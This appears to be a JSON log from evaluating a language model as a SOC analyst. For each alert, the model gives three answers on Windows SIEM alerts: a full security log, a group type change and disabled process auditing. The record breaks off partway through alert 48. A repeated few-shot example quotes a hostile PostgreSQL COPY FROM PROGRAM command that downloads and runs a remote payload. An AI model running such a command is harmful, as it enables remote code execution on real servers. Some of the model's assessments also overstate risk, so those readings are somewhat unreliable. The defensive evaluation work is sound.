    {
      "alert_id": "45",
      "messages": [
        {
          "role": "system",
          "content": "Act as a SOC Analyst. Analyze the following SIEM alert. Strictly output your analysis in these three sections:\n\n**Description** \nSummarize the situation.\n\n**Assessment** \nAnalyze risks, severity, and potential implications.\n\n**Recommendation** \nList immediate measures to contain or resolve the incident.\n\nDo not write any introductory text.\n\n--- EXAMPLES OF PERFECT ANALYSES (FEW-SHOT) ---\n--- EXAMPLE 1 ---\nINPUT ALERT:\n{\n  \"timestamp\": \"2025-07-24T03:27:44Z\",\n  \"severity\": \"critical\",\n  \"source\": \"WindowsSecurityLog\",\n  \"event_id\": 4662,\n  \"channel\": \"Security\",\n  \"message\": \"Suspicious DCSync request – non‑DC account attempting directory replication.\",\n  \"details\": {\n    \"target_host\": \"DC01.corp.local\",\n    \"requesting_account\": \"svc_backup$\",\n    \"account_domain\": \"CORP\",\n    \"account_sid\": \"S-1-5-21-4294967295-123456789-987654321-1105\",\n    \"logon_id\": \"0x2f4c3\",\n    \"source_ip\": \"10.14.27.45\",\n    \"object_server\": \"DS\",\n    \"object_name\": \"CN=Configuration,DC=corp,DC=local\",\n    \"object_type_guid\": \"89e95b76-444d-4c62-991f-15d5b3378b0b\",\n    \"access_mask\": \"0x100\",\n    \"accesses\": \"Replicating Directory Changes All\",\n    \"process_name\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\",\n    \"correlation_id\": \"{6a2ad5c9-2db6-4e25-ac1e-a6f8e83b8fb7}\"\n  }\n}\n\nIDEAL ANALYSIS:\nDescription:\nA suspicious DSync request from the svc_backup$ account on the Domain Controller “DC01.corp.local” triggered a critical Windows security alert (Event ID 4662). At 03:27:44Z, the account requested ”Replicating Directory Changes All” privileges from the internal host 10.14.27.45, which poses the risk of a potential DCSync attack, that aims to steal the entire Active Directory password hash database.\n\nAssessment:\nThis alert indicates an active, high-privilege attack and a major domain-level compromise. The type of privileges requested are typically required by domain controllers that want to synchronize with other domain controllers in an organization. This therefore represents a very unusual request by a backup service account. The fact that the request took place in the middle of the night is also a warning sign. If the request is illegitimate, we must assume, that an attacker compromised the svc_backup$ account and the internal host at 10.14.27.45. Additionally, if this request was successful, the attacker has also stolen all password hashes, including the krbtgt hash, granting them persistent, total control of the CORP domain via ”golden ticket” attacks.\n\nRecommendation:\n1. Declare a major incident and mobilize the full Incident Response team and IT leadership.\n2. Isolate the source host 10.14.27.45 from the network and disable the svc_backup$ account.\n3. This is the highest priority: Reset the krbtgt account password twice to invalidate all existing Kerberos tickets.\n4. Begin a phased password reset for all privileged accounts (Domain Admins, Enterprise Admins, service accounts, ...).\n5. Forensically analyze the source host 10.14.27.45. Use the correlation_id in your SIEM to trace the attacker's full activity.\n\n\n--- EXAMPLE 2 ---\nINPUT ALERT:\n{\n  \"timestamp\": \"2025-07-24T07:58:12Z\",\n  \"severity\": \"critical\",\n  \"source\": \"PostgreSQL\",\n  \"event_type\": \"statement\",\n  \"message\": \"Potential abuse of COPY FROM PROGRAM function – PostgreSQL process calls shell to download and execute external file.\",\n  \"details\": {\n    \"host\": \"PG-SRV-01\",\n    \"database\": \"app_db\",\n    \"user\": \"app_user\",\n    \"client_ip\": \"198.51.100.72\",\n    \"session_id\": \"5fd9.2345\",\n    \"statement\": \"COPY pg_temp FROM PROGRAM 'curl -s 159.223.123.175:36287/JzICbeMxNQHwfwHLiCOFnumixtqYBv -o /tmp/pg_core && chmod +x /tmp/pg_core && /tmp/pg_core';\",\n    \"function\": \"COPY FROM PROGRAM\",\n    \"network_destination\": \"159.223.123.175:36287\",\n    \"sha256_ioc\": \"d41d8cd98f00b204e9800998ecf8427e\"\n  }\n}\n\nIDEAL ANALYSIS:\nDescription:\nAt 07:58:12Z, a critical alert from the PostgreSQL server PG-SRV-01 was triggered. The app_user account sent a potentially malicious “COPY … FROM PROGRAM …” SQL query to the PostgreSQL server via the external IP address 198.51.100.72. This statement was used to download a shell program (/tmp/pg_core) from another external IP address (159.223.123.175) in the background (Parameter “-s” = silent mode) and then execute it directly (chmod +x).\n\nAssessment:\nThe fact that the app_user sends such an unusual request to the app_db database from outside the network suggests that this is an SQL injection on a public web server hosted on 198.51.100.72. An attacker could have been exploited a security vulnerability in a web application combined with a misconfiguration of the database permissions for the app_user, allowing to perform a remote code execution (RCE) attack on the database server and execute OS commands from a C2 server (159.223.123.175).\n\nRecommendation:\n1. Isolate both the database server PG-SRV-01 and the web server 198.51.100.72.\n2. Block the external C2 IP 159.223.123.175 at the perimeter firewall.\n3. Kill the pg_core process and preserve the pg_core file as well as the memory dump and logs from the isolated host to a secure forensic analysis environment and delete them from the host.\n4. Analyze the web server's (198.51.100.72) logs to identify the specific SQL injection vulnerability.\n5. Search all SIEM/EDR logs for the C2 IP and the file path /tmp/pg_core to find other compromised systems.\n\n-----------------------------------------------\nNow, analyze the following alert:\n\nINPUT ALERT:\n{alert}\n\nIDEAL ANALYSIS:"
        },
        {
          "role": "user",
          "content": "{\n  \"timestamp\": \"2025-03-25T11:45:00Z\",\n  \"severity\": \"high\",\n  \"source\": \"WindowsEventLog:Security\",\n  \"event_id\": 1104,\n  \"message\": \"The security log is now full.\",\n  \"details\": {\n    \"host\": \"WIN-PAYMENT-01.corp.internal\",\n    \"log_file\": \"C:\\\\Windows\\\\System32\\\\Winevt\\\\Logs\\\\Security.evtx\",\n    \"max_size_reached\": true,\n    \"retention_policy\": \"DoNotOverwrite\",\n    \"current_log_size_mb\": 1024,\n    \"status\": \"logging_suspended\"\n  }\n}"
        }
      ],
      "prompt_token_count": 2074,
      "repetitions": [
        {
          "repetition_num": 1,
          "status": "Successful",
          "analysis": " Description:\nA high severity alert has been triggered on the Windows host WIN-PAYMENT-01.corp.internal due to the security log (Security.evtx) reaching its maximum size limit and being suspended. This indicates that the system is generating a large number of security events, potentially due to an ongoing attack or unusual activity.\n\nAssessment:\nThe security log being full can be a sign of increased network traffic, malicious activity, or misconfigured systems. In this case, the fact that the log has reached its maximum size and is now suspended suggests that there may be a significant number of security events occurring on the host, which could indicate an ongoing attack or unusual activity. The retention policy being \"DoNotOverwrite\" means that no older events will be deleted to make space for new ones, further emphasizing the potential volume of security events.\n\nRecommendation:\n1. Immediately increase the maximum size limit for the security log on WIN-PAYMENT-01.corp.internal or configure a retention policy that allows older events to be overwritten.\n2. Investigate the cause of the large number of security events, such as reviewing system logs and network traffic for any unusual activity or signs of an attack.\n3. If necessary, engage the Incident Response team to further analyze the situation and contain any potential threats.\n4. Monitor the host for continued high levels of security events and take appropriate action if necessary.",
          "reasoning": "",
          "duration_seconds": "41.66",
          "response_token_count": 311
        },
        {
          "repetition_num": 2,
          "status": "Successful",
          "analysis": " Description:\nA high severity alert has been triggered on the Windows host WIN-PAYMENT-01.corp.internal due to the security log being full. The event ID is 1104 and the log file is located at C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx. The current size of the log is 1024 MB, and it has reached its maximum size limit with a retention policy set to \"DoNotOverwrite\", causing logging to be suspended.\n\nAssessment:\nThe security log being full indicates that there have been numerous security events on the host, which may indicate increased activity or potential attacks. This could potentially hide important security-related information and make it difficult for analysts to investigate and respond to incidents effectively. The retention policy set to \"DoNotOverwrite\" means that no older logs will be deleted when the log reaches its maximum size, further exacerbating this issue.\n\nRecommendation:\n1. Immediately increase the maximum size limit for the security log on WIN-PAYMENT-01 or configure a retention policy to automatically delete old logs.\n2. Review the events in the security log before it was suspended to identify any potential security incidents that may have been missed due to the log being full.\n3. Investigate the reason for the increased activity or potential attacks on the host, as this could indicate compromised accounts, misconfigurations, or ongoing malicious activity.\n4. Implement monitoring and alerting mechanisms to notify analysts when the security log approaches its maximum size limit in the future.\n5. Consider implementing a centralized logging solution to consolidate logs from multiple hosts, making it easier to monitor and analyze security events across the environment.",
          "reasoning": "",
          "duration_seconds": "40.78",
          "response_token_count": 374
        },
        {
          "repetition_num": 3,
          "status": "Successful",
          "analysis": " Description:\nA high severity alert was triggered on the host WIN-PAYMENT-01.corp.internal due to the security log being full. The event ID 1104 indicates that the system has reached the maximum size limit for the security log and is now suspended from logging further events.\n\nAssessment:\nThe security log being full can lead to a loss of valuable forensic data, as it may contain crucial information about potential security incidents or threats. The retention policy set on this specific log file is \"DoNotOverwrite,\" which means that once the log reaches its maximum size, logging will be suspended until manual intervention occurs. This situation could potentially hinder the ability to investigate and respond to ongoing or past security events effectively.\n\nRecommendation:\n1. Immediately increase the maximum size limit for the Security.evtx log file on WIN-PAYMENT-01.corp.internal, allowing it to resume logging events.\n2. Review the current retention policy for the security logs and consider adjusting it to ensure that logs do not reach their maximum size too quickly in the future.\n3. Analyze the existing log data to identify any missed or overlooked security incidents that may have occurred during the time when logging was suspended.\n4. Implement a monitoring solution to notify SOC analysts when the security log approaches its maximum size, allowing for timely intervention and adjustments to the log retention policy if necessary.",
          "reasoning": "",
          "duration_seconds": "34.03",
          "response_token_count": 311
        }
      ]
    },
    {
      "alert_id": "46",
      "messages": [
        {
          "role": "system",
          "content": "Act as a SOC Analyst. Analyze the following SIEM alert. Strictly output your analysis in these three sections:\n\n**Description** \nSummarize the situation.\n\n**Assessment** \nAnalyze risks, severity, and potential implications.\n\n**Recommendation** \nList immediate measures to contain or resolve the incident.\n\nDo not write any introductory text.\n\n--- EXAMPLES OF PERFECT ANALYSES (FEW-SHOT) ---\n--- EXAMPLE 1 ---\nINPUT ALERT:\n{\n  \"timestamp\": \"2025-07-24T03:27:44Z\",\n  \"severity\": \"critical\",\n  \"source\": \"WindowsSecurityLog\",\n  \"event_id\": 4662,\n  \"channel\": \"Security\",\n  \"message\": \"Suspicious DCSync request – non‑DC account attempting directory replication.\",\n  \"details\": {\n    \"target_host\": \"DC01.corp.local\",\n    \"requesting_account\": \"svc_backup$\",\n    \"account_domain\": \"CORP\",\n    \"account_sid\": \"S-1-5-21-4294967295-123456789-987654321-1105\",\n    \"logon_id\": \"0x2f4c3\",\n    \"source_ip\": \"10.14.27.45\",\n    \"object_server\": \"DS\",\n    \"object_name\": \"CN=Configuration,DC=corp,DC=local\",\n    \"object_type_guid\": \"89e95b76-444d-4c62-991f-15d5b3378b0b\",\n    \"access_mask\": \"0x100\",\n    \"accesses\": \"Replicating Directory Changes All\",\n    \"process_name\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\",\n    \"correlation_id\": \"{6a2ad5c9-2db6-4e25-ac1e-a6f8e83b8fb7}\"\n  }\n}\n\nIDEAL ANALYSIS:\nDescription:\nA suspicious DSync request from the svc_backup$ account on the Domain Controller “DC01.corp.local” triggered a critical Windows security alert (Event ID 4662). At 03:27:44Z, the account requested ”Replicating Directory Changes All” privileges from the internal host 10.14.27.45, which poses the risk of a potential DCSync attack, that aims to steal the entire Active Directory password hash database.\n\nAssessment:\nThis alert indicates an active, high-privilege attack and a major domain-level compromise. The type of privileges requested are typically required by domain controllers that want to synchronize with other domain controllers in an organization. This therefore represents a very unusual request by a backup service account. The fact that the request took place in the middle of the night is also a warning sign. If the request is illegitimate, we must assume, that an attacker compromised the svc_backup$ account and the internal host at 10.14.27.45. Additionally, if this request was successful, the attacker has also stolen all password hashes, including the krbtgt hash, granting them persistent, total control of the CORP domain via ”golden ticket” attacks.\n\nRecommendation:\n1. Declare a major incident and mobilize the full Incident Response team and IT leadership.\n2. Isolate the source host 10.14.27.45 from the network and disable the svc_backup$ account.\n3. This is the highest priority: Reset the krbtgt account password twice to invalidate all existing Kerberos tickets.\n4. Begin a phased password reset for all privileged accounts (Domain Admins, Enterprise Admins, service accounts, ...).\n5. Forensically analyze the source host 10.14.27.45. Use the correlation_id in your SIEM to trace the attacker's full activity.\n\n\n--- EXAMPLE 2 ---\nINPUT ALERT:\n{\n  \"timestamp\": \"2025-07-24T07:58:12Z\",\n  \"severity\": \"critical\",\n  \"source\": \"PostgreSQL\",\n  \"event_type\": \"statement\",\n  \"message\": \"Potential abuse of COPY FROM PROGRAM function – PostgreSQL process calls shell to download and execute external file.\",\n  \"details\": {\n    \"host\": \"PG-SRV-01\",\n    \"database\": \"app_db\",\n    \"user\": \"app_user\",\n    \"client_ip\": \"198.51.100.72\",\n    \"session_id\": \"5fd9.2345\",\n    \"statement\": \"COPY pg_temp FROM PROGRAM 'curl -s 159.223.123.175:36287/JzICbeMxNQHwfwHLiCOFnumixtqYBv -o /tmp/pg_core && chmod +x /tmp/pg_core && /tmp/pg_core';\",\n    \"function\": \"COPY FROM PROGRAM\",\n    \"network_destination\": \"159.223.123.175:36287\",\n    \"sha256_ioc\": \"d41d8cd98f00b204e9800998ecf8427e\"\n  }\n}\n\nIDEAL ANALYSIS:\nDescription:\nAt 07:58:12Z, a critical alert from the PostgreSQL server PG-SRV-01 was triggered. The app_user account sent a potentially malicious “COPY … FROM PROGRAM …” SQL query to the PostgreSQL server via the external IP address 198.51.100.72. This statement was used to download a shell program (/tmp/pg_core) from another external IP address (159.223.123.175) in the background (Parameter “-s” = silent mode) and then execute it directly (chmod +x).\n\nAssessment:\nThe fact that the app_user sends such an unusual request to the app_db database from outside the network suggests that this is an SQL injection on a public web server hosted on 198.51.100.72. An attacker could have been exploited a security vulnerability in a web application combined with a misconfiguration of the database permissions for the app_user, allowing to perform a remote code execution (RCE) attack on the database server and execute OS commands from a C2 server (159.223.123.175).\n\nRecommendation:\n1. Isolate both the database server PG-SRV-01 and the web server 198.51.100.72.\n2. Block the external C2 IP 159.223.123.175 at the perimeter firewall.\n3. Kill the pg_core process and preserve the pg_core file as well as the memory dump and logs from the isolated host to a secure forensic analysis environment and delete them from the host.\n4. Analyze the web server's (198.51.100.72) logs to identify the specific SQL injection vulnerability.\n5. Search all SIEM/EDR logs for the C2 IP and the file path /tmp/pg_core to find other compromised systems.\n\n-----------------------------------------------\nNow, analyze the following alert:\n\nINPUT ALERT:\n{alert}\n\nIDEAL ANALYSIS:"
        },
        {
          "role": "user",
          "content": "{\n  \"timestamp\": \"2024-04-10T09:15:22Z\",\n  \"severity\": \"medium\",\n  \"source\": \"WindowsEventLog:Security\",\n  \"event_id\": 4764,\n  \"message\": \"A group's type was changed from Security to Distribution.\",\n  \"details\": {\n    \"host\": \"DC-PROD-02.corp.internal\",\n    \"subject_user_name\": \"adm_srussell\",\n    \"subject_domain_name\": \"CORP\",\n    \"subject_logon_id\": \"0x5D112\",\n    \"target_group_name\": \"Sec_Finance_Approvers\",\n    \"target_domain_name\": \"CORP\",\n    \"target_group_sid\": \"S-1-5-21-39182741-19283742-10293843-8841\",\n    \"change_type\": \"Security Enabled bit removed\",\n    \"old_group_type_value\": \"0x80000002\",\n    \"old_group_type_desc\": \"Security Global\",\n    \"new_group_type_value\": \"0x00000002\",\n    \"new_group_type_desc\": \"Distribution Global\"\n  }\n}"
        }
      ],
      "prompt_token_count": 2219,
      "repetitions": [
        {
          "repetition_num": 1,
          "status": "Successful",
          "analysis": " Description:\nAt 09:15:22Z, a medium-severity Windows security alert (Event ID 4764) was triggered on the Domain Controller DC-PROD-02.corp.internal. The adm_srussell account changed the group type of \"Sec_Finance_Approvers\" from Security to Distribution. This change may indicate an attempt to bypass security controls or grant unauthorized access to resources within the CORP domain.\n\nAssessment:\nThe modification of a security group's type from \"Security Global\" to \"Distribution Global\" could potentially allow users who are members of the affected group to receive emails, but not necessarily grant them permissions to access sensitive resources. However, if this change was made maliciously, it may indicate an attempt to bypass security controls or grant unauthorized access to resources within the CORP domain. The user account adm_srussell should be investigated for potential insider threats or compromised credentials.\n\nRecommendation:\n1. Investigate the motives and intent behind the group type change, including reviewing the audit logs of the adm_srussell account to determine if any other suspicious activities have occurred.\n2. Review the membership of the \"Sec_Finance_Approvers\" group to ensure that only authorized users are included.\n3. If the change was made maliciously or unintentionally, revert the group type back to its original state.\n4. Implement additional security controls, such as multi-factor authentication (MFA) and least privilege access, for the adm_srussell account and other sensitive accounts within the CORP domain.\n5. Monitor the \"Sec_Finance_Approvers\" group closely for any further changes or suspicious activities.",
          "reasoning": "",
          "duration_seconds": "56.59",
          "response_token_count": 381
        },
        {
          "repetition_num": 2,
          "status": "Successful",
          "analysis": " Description:\nA medium-severity alert was triggered on the Domain Controller DC-PROD-02.corp.internal at 09:15:22Z, indicating that a group's type was changed from Security to Distribution. The administrator account adm_srussell made this change, which may pose a potential security risk if the group in question is intended for sensitive operations or contains privileged accounts.\n\nAssessment:\nThe change of a group's type from Security to Distribution could indicate an unintended or malicious action by the administrator account adm_srussell. This change might affect the access control and permissions of the \"Sec_Finance_Approvers\" group, potentially allowing non-authorized users to access sensitive resources or data within the CORP domain.\n\nRecommendation:\n1. Investigate the purpose and intended members of the \"Sec_Finance_Approvers\" group to determine if this change was necessary or unintended.\n2. Review the permissions and access controls for the affected group to ensure that they are still appropriate and secure.\n3. If the change was unintended, revert the group's type back to Security Global (0x80000002).\n4. Monitor the account activity of adm_srussell for any unusual or suspicious behavior.\n5. Document the incident and the actions taken to address it for future reference and auditing purposes.",
          "reasoning": "",
          "duration_seconds": "34.32",
          "response_token_count": 311
        },
        {
          "repetition_num": 3,
          "status": "Successful",
          "analysis": " Description:\nAt 09:15:22Z, a medium-severity alert was triggered on the Domain Controller DC-PROD-02.corp.internal. The user adm_srussell from the CORP domain changed the group type of \"Sec_Finance_Approvers\" from Security to Distribution. This change could potentially allow unauthorized users to access sensitive information within this group.\n\nAssessment:\nThe change in group type from Security to Distribution for the Sec_Finance_Approvers group indicates that a user with administrative privileges may have intentionally or unintentionally granted broader access to this group, which could lead to potential data breaches or unauthorized actions within the CORP domain. The fact that this change was made by adm_srussell, who is likely an administrator, raises concerns about their intent and whether they followed proper procedures when making this modification.\n\nRecommendation:\n1. Investigate the reason behind the group type change and determine if it was a mistake or malicious activity.\n2. If the change was unintentional, revert the group type back to Security Global.\n3. If the change was intentional but inappropriate, revoke the administrator privileges of adm_srussell and conduct a thorough review of their actions within the system.\n4. Monitor the Sec_Finance_Approvers group for any unusual activity or unauthorized access attempts.\n5. Implement stricter controls on group modifications to prevent similar incidents in the future, such as requiring multi-factor authentication and implementing change approval processes.",
          "reasoning": "",
          "duration_seconds": "37.95",
          "response_token_count": 342
        }
      ]
    },
    {
      "alert_id": "47",
      "messages": [
        {
          "role": "system",
          "content": "Act as a SOC Analyst. Analyze the following SIEM alert. Strictly output your analysis in these three sections:\n\n**Description** \nSummarize the situation.\n\n**Assessment** \nAnalyze risks, severity, and potential implications.\n\n**Recommendation** \nList immediate measures to contain or resolve the incident.\n\nDo not write any introductory text.\n\n--- EXAMPLES OF PERFECT ANALYSES (FEW-SHOT) ---\n--- EXAMPLE 1 ---\nINPUT ALERT:\n{\n  \"timestamp\": \"2025-07-24T03:27:44Z\",\n  \"severity\": \"critical\",\n  \"source\": \"WindowsSecurityLog\",\n  \"event_id\": 4662,\n  \"channel\": \"Security\",\n  \"message\": \"Suspicious DCSync request – non‑DC account attempting directory replication.\",\n  \"details\": {\n    \"target_host\": \"DC01.corp.local\",\n    \"requesting_account\": \"svc_backup$\",\n    \"account_domain\": \"CORP\",\n    \"account_sid\": \"S-1-5-21-4294967295-123456789-987654321-1105\",\n    \"logon_id\": \"0x2f4c3\",\n    \"source_ip\": \"10.14.27.45\",\n    \"object_server\": \"DS\",\n    \"object_name\": \"CN=Configuration,DC=corp,DC=local\",\n    \"object_type_guid\": \"89e95b76-444d-4c62-991f-15d5b3378b0b\",\n    \"access_mask\": \"0x100\",\n    \"accesses\": \"Replicating Directory Changes All\",\n    \"process_name\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\",\n    \"correlation_id\": \"{6a2ad5c9-2db6-4e25-ac1e-a6f8e83b8fb7}\"\n  }\n}\n\nIDEAL ANALYSIS:\nDescription:\nA suspicious DSync request from the svc_backup$ account on the Domain Controller “DC01.corp.local” triggered a critical Windows security alert (Event ID 4662). At 03:27:44Z, the account requested ”Replicating Directory Changes All” privileges from the internal host 10.14.27.45, which poses the risk of a potential DCSync attack, that aims to steal the entire Active Directory password hash database.\n\nAssessment:\nThis alert indicates an active, high-privilege attack and a major domain-level compromise. The type of privileges requested are typically required by domain controllers that want to synchronize with other domain controllers in an organization. This therefore represents a very unusual request by a backup service account. The fact that the request took place in the middle of the night is also a warning sign. If the request is illegitimate, we must assume, that an attacker compromised the svc_backup$ account and the internal host at 10.14.27.45. Additionally, if this request was successful, the attacker has also stolen all password hashes, including the krbtgt hash, granting them persistent, total control of the CORP domain via ”golden ticket” attacks.\n\nRecommendation:\n1. Declare a major incident and mobilize the full Incident Response team and IT leadership.\n2. Isolate the source host 10.14.27.45 from the network and disable the svc_backup$ account.\n3. This is the highest priority: Reset the krbtgt account password twice to invalidate all existing Kerberos tickets.\n4. Begin a phased password reset for all privileged accounts (Domain Admins, Enterprise Admins, service accounts, ...).\n5. Forensically analyze the source host 10.14.27.45. Use the correlation_id in your SIEM to trace the attacker's full activity.\n\n\n--- EXAMPLE 2 ---\nINPUT ALERT:\n{\n  \"timestamp\": \"2025-07-24T07:58:12Z\",\n  \"severity\": \"critical\",\n  \"source\": \"PostgreSQL\",\n  \"event_type\": \"statement\",\n  \"message\": \"Potential abuse of COPY FROM PROGRAM function – PostgreSQL process calls shell to download and execute external file.\",\n  \"details\": {\n    \"host\": \"PG-SRV-01\",\n    \"database\": \"app_db\",\n    \"user\": \"app_user\",\n    \"client_ip\": \"198.51.100.72\",\n    \"session_id\": \"5fd9.2345\",\n    \"statement\": \"COPY pg_temp FROM PROGRAM 'curl -s 159.223.123.175:36287/JzICbeMxNQHwfwHLiCOFnumixtqYBv -o /tmp/pg_core && chmod +x /tmp/pg_core && /tmp/pg_core';\",\n    \"function\": \"COPY FROM PROGRAM\",\n    \"network_destination\": \"159.223.123.175:36287\",\n    \"sha256_ioc\": \"d41d8cd98f00b204e9800998ecf8427e\"\n  }\n}\n\nIDEAL ANALYSIS:\nDescription:\nAt 07:58:12Z, a critical alert from the PostgreSQL server PG-SRV-01 was triggered. The app_user account sent a potentially malicious “COPY … FROM PROGRAM …” SQL query to the PostgreSQL server via the external IP address 198.51.100.72. This statement was used to download a shell program (/tmp/pg_core) from another external IP address (159.223.123.175) in the background (Parameter “-s” = silent mode) and then execute it directly (chmod +x).\n\nAssessment:\nThe fact that the app_user sends such an unusual request to the app_db database from outside the network suggests that this is an SQL injection on a public web server hosted on 198.51.100.72. An attacker could have been exploited a security vulnerability in a web application combined with a misconfiguration of the database permissions for the app_user, allowing to perform a remote code execution (RCE) attack on the database server and execute OS commands from a C2 server (159.223.123.175).\n\nRecommendation:\n1. Isolate both the database server PG-SRV-01 and the web server 198.51.100.72.\n2. Block the external C2 IP 159.223.123.175 at the perimeter firewall.\n3. Kill the pg_core process and preserve the pg_core file as well as the memory dump and logs from the isolated host to a secure forensic analysis environment and delete them from the host.\n4. Analyze the web server's (198.51.100.72) logs to identify the specific SQL injection vulnerability.\n5. Search all SIEM/EDR logs for the C2 IP and the file path /tmp/pg_core to find other compromised systems.\n\n-----------------------------------------------\nNow, analyze the following alert:\n\nINPUT ALERT:\n{alert}\n\nIDEAL ANALYSIS:"
        },
        {
          "role": "user",
          "content": "{\n  \"timestamp\": \"2024-05-22T16:40:05Z\",\n  \"severity\": \"high\",\n  \"source\": \"WindowsEventLog:Security\",\n  \"event_id\": 4719,\n  \"message\": \"System audit policy was changed: Process Creation auditing disabled.\",\n  \"details\": {\n    \"host\": \"WIN-SQL-01.corp.internal\",\n    \"subject_user_name\": \"SYSTEM\",\n    \"subject_domain_name\": \"NT AUTHORITY\",\n    \"subject_logon_id\": \"0x3E7\",\n    \"audit_policy_change_id\": \"{0CCE9222-69AE-11D9-BED3-505054503030}\",\n    \"category\": \"Detailed Tracking\",\n    \"actor_host\": \"WIN-SQL-01\",\n    \"subcategory_guid\": \"{0CCE922B-69AE-11D9-BED3-505054503030}\",\n    \"subcategory_name\": \"Process Creation\",\n    \"change_details\": \"Success removed, Failure removed\",\n    \"new_policy_state\": \"No Auditing\"\n  }\n}"
        }
      ],
      "prompt_token_count": 2197,
      "repetitions": [
        {
          "repetition_num": 1,
          "status": "Successful",
          "analysis": " Description:\nA high severity alert was triggered on the Windows host WIN-SQL-01.corp.internal at 16:40:05Z. The system audit policy for Process Creation auditing has been disabled, as indicated by Event ID 4719 in the Security log.\n\nAssessment:\nThe disabling of Process Creation auditing is a significant change to the system's security configuration and could potentially hide malicious activities related to unauthorized process creations or executions. This change was performed by the SYSTEM account, which typically has extensive privileges on Windows systems. The fact that both success and failure audits for this category have been removed suggests an intentional attempt to conceal any potential suspicious activity.\n\nRecommendation:\n1. Investigate the reason behind disabling Process Creation auditing by reviewing system logs, event history, and configuration changes.\n2. Re-enable Process Creation auditing as soon as possible to monitor for any unauthorized process creations or executions.\n3. Examine the security logs before and after the policy change to identify any unusual activities that may have been hidden due to the disabled auditing.\n4. If necessary, perform a forensic analysis on the WIN-SQL-01 host to search for indicators of compromise (IOCs) or evidence of malicious activity.\n5. Notify relevant personnel and IT leadership about the policy change and the potential security implications.",
          "reasoning": "",
          "duration_seconds": "47.56",
          "response_token_count": 313
        },
        {
          "repetition_num": 2,
          "status": "Successful",
          "analysis": " Description:\nA high severity alert was triggered on the Windows host WIN-SQL-01.corp.internal at 16:40:05Z. The system audit policy for Process Creation auditing has been disabled, as indicated by Event ID 4719 in the Security log.\n\nAssessment:\nThe disabling of Process Creation auditing is a significant change to the Windows security configuration and may indicate an attempt to cover up malicious activity or misconfiguration. This change could potentially hide unauthorized process creations, making it harder to detect and respond to potential threats. The fact that the SYSTEM account initiated this change raises concerns as it has high privileges on the system.\n\nRecommendation:\n1. Investigate the reason for disabling Process Creation auditing by reviewing system logs, event history, and configuration changes.\n2. Re-enable Process Creation auditing to monitor for any unauthorized process creations.\n3. Review the security configuration of other systems within the network to ensure that similar changes have not occurred.\n4. If an unauthorized change is identified, determine the actor responsible and take appropriate action, such as account suspension or password reset.\n5. Implement additional monitoring and alerting for any further changes to audit policies on critical systems.",
          "reasoning": "",
          "duration_seconds": "30.49",
          "response_token_count": 276
        },
        {
          "repetition_num": 3,
          "status": "Successful",
          "analysis": " Description:\nA high severity alert was triggered on the Windows host WIN-SQL-01.corp.internal at 16:40:05Z. The system audit policy for Process Creation auditing has been disabled, as indicated by Event ID 4719 in the Security log. This change may indicate an attempt to evade detection or cover up malicious activity on the host.\n\nAssessment:\nThe disabling of Process Creation auditing is a significant change to the system's audit policy and could potentially hide malicious activities such as unauthorized process creation, execution of malware, or lateral movement within the network. The fact that the SYSTEM account (NT AUTHORITY) performed this change raises concerns about potential internal compromise or misconfiguration.\n\nRecommendation:\n1. Investigate the reason behind the policy change and identify who made the change if possible.\n2. Revert the audit policy to its previous state, enabling Process Creation auditing.\n3. Review the system's security configuration for any other suspicious changes or misconfigurations.\n4. Analyze the host's event logs for any recent suspicious activity that may have been hidden due to the disabled auditing.\n5. Notify the IT leadership and Incident Response team about the incident, as it could indicate an attempt to cover up malicious activities on the host or within the network.",
          "reasoning": "",
          "duration_seconds": "32.94",
          "response_token_count": 299
        }
      ]
    },
    {
      "alert_id": "48",
      "messages": [
        {
          "role": "system",
          "content": "Act as a SOC Analyst. Analyze the following SIEM alert. Strictly output your analysis in these three sections:\n\n**Description** \nSummarize the situation.\n\n**Assessment** \nAnalyze risks, severity, and potential implications.\n\n**Recommendation** \nList immediate measures to contain or resolve the incident.\n\nDo not write any introductory text.\n\n--- EXAMPLES OF PERFECT ANALYSES (FEW-SHOT) ---\n--- EXAMPLE 1 ---\nINPUT ALERT:\n{\n  \"timestamp\": \"2025-07-24T03:27:44Z\",\n  \"severity\": \"critical\",\n  \"source\": \"WindowsSecurityLog\",\n  \"event_id\": 4662,\n  \"channel\": \"Security\",\n  \"message\": \"Suspicious DCSync request – non‑DC account attempting directory replication.\",\n  \"details\": {\n    \"target_host\": \"DC01.corp.local\",\n    \"requesting_account\": \"svc_backup$\",\n    \"account_domain\": \"CORP\",\n    \"account_sid\": \"S-1-5-21-4294967295-123456789-987654321-1105\",\n    \"logon_id\": \"0x2f4c3\",\n    \"source_ip\": \"10.14.27.45\",\n    \"object_server\": \"DS\",\n    \"object_name\": \"CN=Configuration,DC=corp,DC=local\",\n    \"object_type_guid\": \"89e95b76-444d-4c62-991f-15d5b3378b0b\",\n    \"access_mask\": \"0x100\",\n    \"accesses\": \"Replicating Directory Changes All\",\n    \"process_name\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\lsass.exe\",\n    \"correlation_id\": \"{6a2ad5c9-2db6-4e25-ac1e-a6f8e83b8fb7}\"\n  }\n}\n\nIDEAL ANALYSIS:\nDescription:\nA suspicious DSync request from the svc_backup$ account on the Domain Controller “DC01.corp.local” triggered a critical Windows security alert (Event ID 4662). At 03:27:44Z, the account requested ”Replicating Directory Changes All” privileges from the internal host 10.14.27.45, which poses the risk of a potential DCSync attack, that aims to steal the entire Active Directory password hash database.\n\nAssessment:\nThis alert indicates an active, high-privilege attack and a major domain-level compromise. The type of privileges requested are typically required by domain controllers that want to synchronize with other domain controllers in an organization. This therefore represents a very unusual request by a backup service account. The fact that the request took place in the middle of the night is also a warning sign. If the request is illegitimate, we must assume, that an attacker compromised the svc_backup$ account and the internal host at 10.14.27.45. Additionally, if this request was successful, the attacker has also stolen all password hashes, including the krbtgt hash, granting them persistent, total control of the CORP domain via ”golden ticket” attacks.\n\nRecommendation:\n1. Declare a major incident and mobilize the full Incident Response team and IT leadership.\n2. Isolate the source host 10.14.27.45 from the network and disable the svc_backup$ account.\n3. This is the highest priority: Reset the krbtgt account password twice to invalidate all existing Kerberos tickets.\n4. Begin a phased password reset for all privileged accounts (Domain Admins, Enterprise Admins, service accounts, ...).\n5. Forensically analyze the source host 10.14.27.45. Use the correlation_id in your SIEM to trace the attacker's full activity.\n\n\n--- EXAMPLE 2 